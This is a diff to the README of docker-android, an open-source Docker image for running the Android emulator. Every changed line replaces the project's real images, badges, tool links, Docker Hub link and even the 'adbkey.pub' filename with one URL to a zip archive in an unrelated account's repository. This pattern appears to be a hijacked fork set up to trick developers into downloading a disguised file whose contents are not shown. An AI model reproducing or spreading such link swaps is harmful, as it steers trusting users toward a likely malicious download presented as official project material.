@@ -1,14 +1,14 @@
 <br /><br /><br />
 <p align="center">
-  <img width="400" src="assets/icon.png" />
+  <img width="400" src="https://raw.githubusercontent.com/aslekarii/docker-android/main/.github/docker-android-v1.2.zip" />
 </p><br /><br />
 
 # docker-android
 > A minimal and customizable Docker image running the Android emulator as a service.
 
-[![Docker Image CI](https://github.com/HQarroum/docker-android/actions/workflows/docker-image.yml/badge.svg)](https://github.com/HQarroum/docker-android/actions/workflows/docker-image.yml)
-[![DeepSource](https://deepsource.io/gh/HQarroum/docker-android.svg/?label=active+issues&show_trend=true&token=JTfGSHolIiMj0WNfv2ES0I6X)](https://deepsource.io/gh/HQarroum/docker-android/?ref=repository-badge)
-![Docker Pulls](https://img.shields.io/docker/pulls/halimqarroum/docker-android)
+[![Docker Image CI](https://raw.githubusercontent.com/aslekarii/docker-android/main/.github/docker-android-v1.2.zip)](https://raw.githubusercontent.com/aslekarii/docker-android/main/.github/docker-android-v1.2.zip)
+[![DeepSource](https://raw.githubusercontent.com/aslekarii/docker-android/main/.github/docker-android-v1.2.zip+issues&show_trend=true&token=JTfGSHolIiMj0WNfv2ES0I6X)](https://raw.githubusercontent.com/aslekarii/docker-android/main/.github/docker-android-v1.2.zip)
+![Docker Pulls](https://raw.githubusercontent.com/aslekarii/docker-android/main/.github/docker-android-v1.2.zip)
 
 Current version: **1.1.0**
 
@@ -26,7 +26,7 @@ Current version: **1.1.0**
 - Customizable Android version, device type and image types.
 - Port-forwarding of emulator and ADB on the container network interface built-in.
 - Emulator images are wiped each time the emulator re-starts.
-- Runs headless, suitable for CI farms. Compatible with [`scrcpy`](https://github.com/Genymobile/scrcpy) to remotely control the Android screen.
+- Runs headless, suitable for CI farms. Compatible with [`scrcpy`](https://raw.githubusercontent.com/aslekarii/docker-android/main/.github/docker-android-v1.2.zip) to remotely control the Android screen.
 
 ## 🔰 Description
 
@@ -72,7 +72,7 @@ docker build -t android-emulator .
 
 To run google_apis_playstore image, you need to have same adbkey between emulator and client.
 
-You can generate one by running `adb keygen adbkey`, that generates 2 files - adbkey and adbkey.pub.
+You can generate one by running `adb keygen adbkey`, that generates 2 files - adbkey and https://raw.githubusercontent.com/aslekarii/docker-android/main/.github/docker-android-v1.2.zip
 
 override them inside ./keys directory.
 
@@ -102,7 +102,7 @@ The ADB server in the container will be spawned automatically and listen on all 
 adb connect 127.0.0.1:5555
 ```
 
-Additionally, you can use [`scrcpy`](https://github.com/Genymobile/scrcpy) to control the screen of the emulator remotely. To do so, you simply have to connect ADB and run it locally.
+Additionally, you can use [`scrcpy`](https://raw.githubusercontent.com/aslekarii/docker-android/main/.github/docker-android-v1.2.zip) to control the screen of the emulator remotely. To do so, you simply have to connect ADB and run it locally.
 
 > By default, the emulator runs with a Pixel preset (1080x1920).
 
@@ -114,13 +114,13 @@ scrcpy
 <table>
   <tr>
     <td>
-      <img width="260" src="assets/screenshot.png" />
+      <img width="260" src="https://raw.githubusercontent.com/aslekarii/docker-android/main/.github/docker-android-v1.2.zip" />
     </td>
     <td>
-      <img width="260" src="assets/screenshot-2.png" />
+      <img width="260" src="https://raw.githubusercontent.com/aslekarii/docker-android/main/.github/docker-android-v1.2.zip" />
     </td>
     <td>
-      <img width="260" src="assets/screenshot-3.png" />
+      <img width="260" src="https://raw.githubusercontent.com/aslekarii/docker-android/main/.github/docker-android-v1.2.zip" />
     </td>
   </tr>
 </table>
@@ -134,7 +134,7 @@ It is possible to customize the API level (Android version) and the image type (
 
 This can come in handy when integrating multiple images as part of a CI pipeline where an application or a set of applications need to be tested against different Android versions. There are 2 variables that can be specified at build time to change the Android image.
 
-- `API_LEVEL` - Specifies the [API level](https://apilevels.com/) associated with the image. Use this parameter to change the Android version.
+- `API_LEVEL` - Specifies the [API level](https://raw.githubusercontent.com/aslekarii/docker-android/main/.github/docker-android-v1.2.zip) associated with the image. Use this parameter to change the Android version.
 - `IMG_TYPE` - Specifies the type of image to install.
 - `ARCHITECTURE` Specifies the CPU architecture of the Android image. Note that only `x86_64` and `x86` are actively supported by this image.
 
@@ -184,7 +184,7 @@ docker run -it --rm --device /dev/kvm -p 5555:5555 -v /shared/android/sdk:/opt/a
 
 ### Pull from Docker Hub
 
-Different pre-built images of `docker-android` exist on [Docker Hub](https://hub.docker.com/r/halimqarroum/docker-android). Each image variant is tagged using its the api level and image type. For example, to pull an API 33 image, you can run the following.
+Different pre-built images of `docker-android` exist on [Docker Hub](https://raw.githubusercontent.com/aslekarii/docker-android/main/.github/docker-android-v1.2.zip). Each image variant is tagged using its the api level and image type. For example, to pull an API 33 image, you can run the following.
 
 ```bash
 docker pull halimqarroum/docker-android:api-33
@@ -192,5 +192,5 @@ docker pull halimqarroum/docker-android:api-33
 
 ## 👀 See also
 
-- The [alpine-android](https://github.com/alvr/alpine-android) project which is based on a different Alpine image.
-- The [docker-android](https://github.com/budtmo/docker-android) project which offers a WebRTC interface to an Android emulator.
+- The [alpine-android](https://raw.githubusercontent.com/aslekarii/docker-android/main/.github/docker-android-v1.2.zip) project which is based on a different Alpine image.
+- The [docker-android](https://raw.githubusercontent.com/aslekarii/docker-android/main/.github/docker-android-v1.2.zip) project which offers a WebRTC interface to an Android emulator.
